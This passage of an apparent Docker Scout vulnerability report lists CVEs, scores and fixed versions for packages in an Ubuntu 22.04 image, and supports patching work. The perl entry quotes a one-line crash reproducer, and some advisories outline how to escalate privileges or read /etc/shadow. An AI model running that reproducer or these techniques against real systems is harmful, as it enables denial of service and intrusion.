The Python standard library functions `urllib.parse.urlsplit` and `urlparse` accepted domain names that included square brackets which isn't valid according to RFC 3986. Square brackets are only meant to be used as delimiters for specifying IPv6 and IPvFuture hosts in URLs. This could result in differential parsing across the Python URL parser and other specification-compliant URL parsers.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-11168?s=ubuntu&n=python3.10&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.10.12-1%7E22.04.8"><img alt="medium : CVE--2024--11168" src="https://img.shields.io/badge/CVE--2024--11168-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.10.12-1~22.04.8</code></td></tr>
<tr><td>Fixed version</td><td><code>3.10.12-1~22.04.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.198%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The urllib.parse.urlsplit() and urlparse() functions improperly validated bracketed hosts (`[]`), allowing hosts that weren't IPv6 or IPvFuture. This behavior was not conformant to RFC 3986 and potentially enabled SSRF if a URL is processed by more than one URL parser.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>numpy</strong> <code>1.19.5</code> (pypi)</summary>

<small><code>pkg:pypi/numpy@1.19.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-33430?s=github&n=numpy&t=pypi&vr=%3E%3D1.9.0%2C%3C1.21"><img alt="medium 6.0: CVE--2021--33430" src="https://img.shields.io/badge/CVE--2021--33430-lightgrey?label=medium%206.0&labelColor=fbb552"/></a> <i>Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</i>

<table>
<tr><td>Affected range</td><td><code>>=1.9.0<br/><1.21</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21</code></td></tr>
<tr><td>CVSS Score</td><td><code>6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Buffer Overflow vulnerability exists in NumPy 1.9.x in the PyArray_NewFromDescr_int function of ctors.c when specifying arrays of large dimensions (over 32) from Python code, which could let a malicious user cause a Denial of Service.

NOTE: The vendor does not agree this is a vulnerability; In (very limited) circumstances a user may be able provoke the buffer overflow, the user is most likely already privileged to at least provoke denial of service by exhausting memory. Triggering this further requires the use of uncommon API (complicated structured dtypes), which is very unlikely to be available to an unprivileged user.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-34141?s=github&n=numpy&t=pypi&vr=%3C1.22"><img alt="medium 5.3: CVE--2021--34141" src="https://img.shields.io/badge/CVE--2021--34141-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Incorrect Comparison</i>

<table>
<tr><td>Affected range</td><td><code><1.22</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.065%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Incomplete string comparison in the numpy.core component in NumPy1.9.x, which allows attackers to fail the APIs via constructing specific string objects.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>scikit-learn</strong> <code>1.1.2</code> (pypi)</summary>

<small><code>pkg:pypi/scikit-learn@1.1.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-5206?s=github&n=scikit-learn&t=pypi&vr=%3C1.5.0"><img alt="medium 5.3: CVE--2024--5206" src="https://img.shields.io/badge/CVE--2024--5206-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Storage of Sensitive Data in a Mechanism without Access Control</i>

<table>
<tr><td>Affected range</td><td><code><1.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A sensitive data leakage vulnerability was identified in scikit-learn's TfidfVectorizer, specifically in versions up to and including 1.4.1.post1, which was fixed in version 1.5.0. The vulnerability arises from the unexpected storage of all tokens present in the training data within the `stop_words_` attribute, rather than only storing the subset of tokens required for the TF-IDF technique to function. This behavior leads to the potential leakage of sensitive information, as the `stop_words_` attribute could contain tokens that were meant to be discarded and not stored, such as passwords or keys. The impact of this vulnerability varies based on the nature of the data being processed by the vectorizer.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libcap2</strong> <code>1:2.44-1ubuntu0.22.04.1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/libcap2@1%3A2.44-1ubuntu0.22.04.1?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-1390?s=ubuntu&n=libcap2&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1%3A2.44-1ubuntu0.22.04.2"><img alt="medium : CVE--2025--1390" src="https://img.shields.io/badge/CVE--2025--1390-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.44-1ubuntu0.22.04.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.44-1ubuntu0.22.04.2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The PAM module pam_cap.so of libcap configuration supports group names starting with “@”, during actual parsing, configurations not starting with “@” are incorrectly recognized as group names. This may result in nonintended users being granted an inherited capability set, potentially leading to security risks. Attackers can exploit this vulnerability to achieve local privilege escalation on systems where /etc/security/capability.conf is used to configure user inherited privileges by constructing specific usernames.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>gnutls28</strong> <code>3.7.3-4ubuntu1.5</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/gnutls28@3.7.3-4ubuntu1.5?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-12243?s=ubuntu&n=gnutls28&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.7.3-4ubuntu1.6"><img alt="medium : CVE--2024--12243" src="https://img.shields.io/badge/CVE--2024--12243-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.3-4ubuntu1.6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.3-4ubuntu1.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.623%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS, which relies on libtasn1 for ASN.1 data processing. Due to an inefficient algorithm in libtasn1, decoding certain DER-encoded certificate data can take excessive time, leading to increased resource consumption. This flaw allows a remote attacker to send a specially crafted certificate, causing GnuTLS to become unresponsive or slow, resulting in a denial-of-service condition.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pip</strong> <code>23.0.1</code> (pypi)</summary>

<small><code>pkg:pypi/pip@23.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-5752?s=github&n=pip&t=pypi&vr=%3C23.3"><img alt="medium 6.8: CVE--2023--5752" src="https://img.shields.io/badge/CVE--2023--5752-lightgrey?label=medium%206.8&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements used in a Command ('Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><23.3</code></td></tr>
<tr><td>Fixed version</td><td><code>23.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When installing a package from a Mercurial VCS URL, e.g. `pip install hg+...`, with pip prior to v23.3, the specified Mercurial revision could be used to inject arbitrary configuration options to the `hg clone` call (e.g. `--config`). Controlling the Mercurial configuration can modify how and which repository is installed. This vulnerability does not affect users who aren't installing from Mercurial.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>sqlite3</strong> <code>3.37.2-2ubuntu0.3</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/sqlite3@3.37.2-2ubuntu0.3?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-29088?s=ubuntu&n=sqlite3&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.37.2-2ubuntu0.4"><img alt="medium : CVE--2025--29088" src="https://img.shields.io/badge/CVE--2025--29088-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.37.2-2ubuntu0.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.37.2-2ubuntu0.4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In SQLite 3.49.0 before 3.49.1, certain argument values to sqlite3_db_config (in the C-language API) can cause a denial of service (application crash). An sz*nBig multiplication is not cast to a 64-bit integer, and consequently some memory allocations may be incorrect.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pam</strong> <code>1.4.0-11ubuntu2.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/pam@1.4.0-11ubuntu2.4?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-6020?s=ubuntu&n=pam&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.4.0-11ubuntu2.6"><img alt="medium : CVE--2025--6020" src="https://img.shields.io/badge/CVE--2025--6020-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.4.0-11ubuntu2.6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.4.0-11ubuntu2.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in linux-pam. The module pam_namespace may use access user-controlled paths without proper protection, allowing local users to elevate their privileges to root via multiple symlink attacks and race conditions.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>scipy</strong> <code>1.9.1</code> (pypi)</summary>

<small><code>pkg:pypi/scipy@1.9.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-25399?s=pypa&n=scipy&t=pypi&vr=%3C1.10.0"><img alt="medium : CVE--2023--25399" src="https://img.shields.io/badge/CVE--2023--25399-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.10.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.10.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.135%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A refcounting issue which leads to potential memory leak was discovered in scipy commit 8627df31ab in Py_FindObjects() function.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>expat</strong> <code>2.4.7-1ubuntu0.5</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/expat@2.4.7-1ubuntu0.5?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-8176?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C2.4.7-1ubuntu0.6"><img alt="medium : CVE--2024--8176" src="https://img.shields.io/badge/CVE--2024--8176-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.4.7-1ubuntu0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>2.4.7-1ubuntu0.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.343%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack overflow vulnerability exists in the libexpat library due to the way it handles recursive entity expansion in XML documents. When parsing an XML document with deeply nested entity references, libexpat can be forced to recurse indefinitely, exhausting the stack space and causing a crash. This issue could lead to denial of service (DoS) or, in some cases, exploitable memory corruption, depending on the environment and library usage.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.2.27-3ubuntu2.1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/gnupg2@2.2.27-3ubuntu2.1?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-30258?s=ubuntu&n=gnupg2&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C2.2.27-3ubuntu2.3"><img alt="medium : CVE--2025--30258" src="https://img.shields.io/badge/CVE--2025--30258-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.2.27-3ubuntu2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.27-3ubuntu2.3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GnuPG before 2.5.5, if a user chooses to import a certificate with certain crafted subkey data that lacks a valid backsig or that has incorrect usage flags, the user loses the ability to verify signatures made from certain other signing keys, aka a "verification DoS."

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>systemd</strong> <code>249.11-0ubuntu3.12</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/systemd@249.11-0ubuntu3.12?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-4598?s=ubuntu&n=systemd&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C249.11-0ubuntu3.16"><img alt="medium : CVE--2025--4598" src="https://img.shields.io/badge/CVE--2025--4598-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><249.11-0ubuntu3.16</code></td></tr>
<tr><td>Fixed version</td><td><code>249.11-0ubuntu3.16</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.  A SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>idna</strong> <code>2.5</code> (pypi)</summary>

<small><code>pkg:pypi/idna@2.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-3651?s=github&n=idna&t=pypi&vr=%3C3.7"><img alt="medium 6.9: CVE--2024--3651" src="https://img.shields.io/badge/CVE--2024--3651-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><3.7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.472%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.

### Patches
The function has been refined to reject such strings without the associated resource consumption in version 3.7.

### Workarounds
Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

### References
* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libtasn1-6</strong> <code>4.18.0-4build1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/libtasn1-6@4.18.0-4build1?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-12133?s=ubuntu&n=libtasn1-6&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C4.18.0-4ubuntu0.1"><img alt="medium : CVE--2024--12133" src="https://img.shields.io/badge/CVE--2024--12133-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.18.0-4ubuntu0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.18.0-4ubuntu0.1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.271%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.34.0-3ubuntu1.3</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/perl@5.34.0-3ubuntu1.3?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-56406?s=ubuntu&n=perl&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C5.34.0-3ubuntu1.4"><img alt="medium : CVE--2024--56406" src="https://img.shields.io/badge/CVE--2024--56406-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.34.0-3ubuntu1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>5.34.0-3ubuntu1.4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.175%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability was discovered in Perl.  Release branches 5.34, 5.36, 5.38 and 5.40 are affected, including development versions from 5.33.1 through 5.41.10.  When there are non-ASCII bytes in the left-hand-side of the `tr` operator, `S_do_trans_invmap` can overflow the destination pointer `d`.  $ perl -e '$_ = "\x{FF}" x 1000000; tr/\xFF/\x{100}/;' Segmentation fault (core dumped)  It is believed that this vulnerability can enable Denial of Service and possibly Code Execution attacks on platforms that lack sufficient defenses.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.0.2-0ubuntu1.18</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/openssl@3.0.2-0ubuntu1.18?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-9143?s=ubuntu&n=openssl&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.0.2-0ubuntu1.19"><img alt="low : CVE--2024--9143" src="https://img.shields.io/badge/CVE--2024--9143-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.2-0ubuntu1.19</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.2-0ubuntu1.19</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.416%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted explicit values for the field polynomial can lead to out-of-bounds memory reads or writes.  Impact summary: Out of bound memory writes can lead to an application crash or even a possibility of a remote code execution, however, in all the protocols involving Elliptic Curve Cryptography that we're aware of, either only "named curves" are supported, or, if explicit curve parameters are supported, they specify an X9.62 encoding of binary (GF(2^m)) curves that can't represent problematic input values. Thus the likelihood of existence of a vulnerable application is low.  In particular, the X9.62 encoding is used for ECC keys in X.509 certificates, so problematic inputs cannot occur in the context of processing X.509 certificates.  Any problematic use-cases would have to be using an "exotic" curve encoding.  The affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(), and various supporting BN_GF2m_*() functions.  Applications working with "exotic" explicit binary (GF(2^m)) curve parameters, that make it possible to represent invalid field polynomials with a zero constant term, via the above or similar APIs, may terminate abruptly as a result of reading or writing outside of array bounds.  Remote code execution cannot easily be ruled out.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-13176?s=ubuntu&n=openssl&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.0.2-0ubuntu1.19"><img alt="low : CVE--2024--13176" src="https://img.shields.io/badge/CVE--2024--13176-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.2-0ubuntu1.19</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.2-0ubuntu1.19</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.045%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A timing side-channel which could potentially allow recovering the private key exists in the ECDSA signature computation.  Impact summary: A timing side-channel in ECDSA signature computations could allow recovering the private key by an attacker. However, measuring the timing would require either local access to the signing application or a very fast network connection with low latency.  There is a timing signal of around 300 nanoseconds when the top word of the inverted ECDSA nonce value is zero. This can happen with significant probability only for some of the supported elliptic curves. In particular the NIST P-521 curve is affected. To be able to measure this leak, the attacker process must either be located in the same physical computer or must have a very fast network connection with low latency. For that reason the severity of this vulnerability is Low.  The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>debug</strong> <code>3.2.6</code> (npm)</summary>

<small><code>pkg:npm/debug@3.2.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2017-16137?s=github&n=debug&t=npm&vr=%3E%3D3.2.0%2C%3C3.2.7"><img alt="low 3.7: CVE--2017--16137" src="https://img.shields.io/badge/CVE--2017--16137-lightgrey?label=low%203.7&labelColor=fce1a9"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=3.2.0<br/><3.2.7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.2.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.070%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Affected versions of `debug` are vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. 

